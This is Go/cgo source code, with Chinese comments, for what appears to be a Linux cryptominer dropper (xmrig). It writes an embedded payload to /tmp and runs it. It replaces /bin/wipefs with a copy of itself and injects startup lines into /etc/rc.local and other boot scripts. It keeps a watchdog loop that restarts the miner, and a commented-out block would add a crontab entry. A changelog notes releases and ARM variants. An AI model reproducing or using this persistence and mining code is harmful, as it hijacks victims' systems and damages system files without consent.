package main

import "C"
import (
	"os"
	"path"
	"strings"
	"io"
	"time"
)

/*

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include "ShellCode.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include "xxs.h"
#include <limits.h>

 struct FALLEN_DATA
{
	unsigned int finder;
	char xxs[1000];//执行命令
//	char Rtime[1000];//自定义复活时间
	char filename[1000];//释放文件名
}
fallen_data =
{
	0xF9E28F8D,
	"xxs",
	"filename"
};

char *xxs =fallen_data.xxs;
//char Rtime[1000];//自定义复活时间
char *filename =fallen_data.filename;//释放文件名

void Releasefiles(char sfmul[PATH_MAX])
{
	int fp = open(sfmul, O_RDWR|O_CREAT);
	write (fp, m_MyShellCodeFileBuf, m_MyShellCodeFileSize);
	close (fp);
}
//////////直接引用台风源码//我比较懒一点
////////////这个是飞鹰公布的源码，一看就不全，下个版本采用服务启动
void autoboot(char command[PATH_MAX])
{
    char cmd[100];
    char pwd[256];
    getcwd(pwd,sizeof(pwd));
    sprintf( cmd,"sed -i -e '/exit/d' /etc/rc.local");
    system ( cmd );
    sprintf( cmd,"sed -i -e '/^\r\n|\r|\n$/d' /etc/rc.local");
    system ( cmd );
    sprintf( cmd,"sed -i -e '/%s/d' /etc/rc.local",command);
    system ( cmd );
    sprintf( cmd,"sed -i -e '2 i\%s/%s' /etc/rc.local",pwd,command);
    system ( cmd );
    sprintf( cmd,"sed -i -e '2 i\%s/%s start' /etc/rc.d/rc.local",pwd,command);
    system ( cmd );
    sprintf( cmd,"sed -i -e '2 i\%s/%s start' /etc/init.d/boot.local",pwd,command);
    system ( cmd );
}

*/
import "C"



//////////////获取自身文件名
var filenameOnly string
func file() {
	fullFilename := os.Args[0]
	var filenameWithSuffix string
	filenameWithSuffix = path.Base(fullFilename) //获取文件名带后缀
	var fileSuffix string
	fileSuffix = path.Ext(filenameWithSuffix) //获取文件后缀
	filenameOnly = strings.TrimSuffix(filenameWithSuffix, fileSuffix) //获取文件名

}

///获取结束
//暂时关闭这个功能
/*func ScheduledTask() {
	////////获取自身文件名开始
	filename := "/"
	filename += filenameOnly
	/////////获取自身文件名结束
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	//////////连接字符串添加计划任务
	pwd += filename
	mulu1 := "echo '0 "
	mulu1 += C.GoString(&C.Rtime[0])
	mulu3 := " * * * * root "
	mulu2 := "' >> /etc/crontab"
	mulu1 += pwd
	mulu1 += mulu2
	//////////连接结束
	///////////开始执行命令
	cmd := exec.Command("/bin/bash", "-c", mulu1)
	out, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(out))
	//////////执行结束
	//fmt.Println(mulu1) //打印复活指令用的

}*/

//复制文件
func CopyFile(dstName, srcName string) (written int64, err error) {
	src, err := os.Open(srcName)
	if err != nil {
		return
	}
	defer src.Close()
	dst, err := os.OpenFile(dstName, os.O_WRONLY|os.O_CREATE, 777)
	if err != nil {
		return
	}
	defer dst.Close()
	return io.Copy(dst, src)
}

func RunFile(filename string){
	var tmp = "/tmp/"
	tmp += filename
	C.Releasefiles(C.CString(tmp))//释放xmrig文件
	prefix := "."
	prefix += tmp
	//prefix += C.GoString(&C.xxs[0])//文件名连接参数
	prefix += C.GoString(C.xxs)
	//fmt.Println(prefix)//输出完整的执行命令（运行程序）
	C.system (C.CString(prefix))

	////////////执行结束
}
func Boot() {
	boot1 :=filenameOnly
	os.Remove("/bin/wipefs")//有一招叫啥
	CopyFile("/bin/wipefs",filenameOnly)//就叫偷梁换柱
	boot2 :=" reboot"
	boot1 += boot2
	//	fmt.Println(boot1) 输出命令
	C.autoboot(C.CString(boot1))
}
//写入文件

func main() {
	C.daemon(0,0)//cgo就是好，没有什么是一行代码解决不了的，如果有，我就写二行（后台运行）
	file()
	Boot()//重启上线，暂时这么写
	downloadfile :=C.GoString(C.filename)
	//ScheduledTask()    //添加计划任务复活//暂时停止这个功能不能用......
	RunFile(downloadfile) //释放文件并且运行啦
	for true { //没有while，我很难受啊
		if C.IsExistProcess(C.CString (downloadfile))==false {//false为主，不然可能无限复活

			time.Sleep(500)
			RunFile(downloadfile)//进程死了就启动

	 }  else
		{	//存在的话就不管他了
			time.Sleep(500)

		}
		time.Sleep(500)
	}

}

/*
写的很智障，见谅
qq：1509477745
http://blog.xn--pssa2683b.top/
5月5号1.1发布
5月26号2.1发布：修改了重启上线，尝试增强linux兼容性
7月3号2.2发布：再次修改了重启上线，应该彻底解决了126，127问题，增加了进程守护，linux兼容性再次增强，修复无root无法挖矿问题
7月24日2.3发布：增加arm马，新增生成分组，增加了自定义进程功能
8月11日2.3.1发布：暂时删除arm马，修复了部分系统无限复活的bug，尝试解决部分系统内核释放不完整，优化了整体代码.
 */

/********************************************************************************************************

                                      _oo0oo_
                                     o8888888o
                                     88" . "88
                                     (| -_- |)
                                     0\  =  /0
                                   ___/`---'\___
                                 .' \\|     |// '.
                                / \\|||  :  |||// \
                               / _||||| -:- |||||- \
                              |   | \\\  -  /// |   |
                              | \_|  ''\---/''  |_/ |
                              \  .-\__  '-'  ___/-. /
                            ___'. .'  /--.--\  `. .'___
                         ."" '<  `.___\_<|>_/___.' >' "".
                        | | :  `- \`.;`\ _ /`;.`/ - ` : | |
                        \  \ `_.   \_ __\ /__ _/   .-` /  /
                    =====`-.____`.___ \_____/___.-`___.-'=====
                                      `=---='
                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                          佛祖保佑    永无BUG    永不修改

********************************************************************************************************/
/**
 *　　　　　　　 ┏┓　 ┏┓+ +
 *　　　　　　　┏┛┻━━━┛┻┓ + +
 *　　　　　　　┃　　　　　　┃ 　
 *　　　　　　　┃　　　━　　 ┃ ++ + + +
 *　　　　　　 ████━████  ┃+
 *　　　　　　　┃　　　　　　　┃ +
 *　　　　　　　┃　　　┻　　　┃
 *　　　　　　　┃　　　　　　┃ + +
 *　　　　　　　┗━┓　　　┏━┛
 *　　　　　　　　 ┃　　　┃　　　　　　　　　　　
 *　　　　　　　　 ┃　　　┃ + + + +
 *　　　　　　　　 ┃　　　┃　　　　Code is far away from bug with the animal protecting　　　　　　　
 *　　　　　　　　 ┃　　　┃ + 　　　　神兽保佑,代码无bug　　
 *　　　　　　　　 ┃　　　┃
 *　　　　　　　　 ┃　　　┃　　+　　　　　　　　　
 *　　　　　　　　 ┃　 　 ┗━━━┓ + +
 *　　　　　　　　 ┃ 　　　　   ┣┓
 *　　　　　　　　 ┃ 　　　　　 ┏┛
 *　　　　　　　　 ┗┓┓┏━┳┓┏┛ + + + +
 *　　　　　　　　  ┃┫┫ ┃┫┫
 *　　　　　　　　  ┗┻┛ ┗┻┛+ + + +
 */
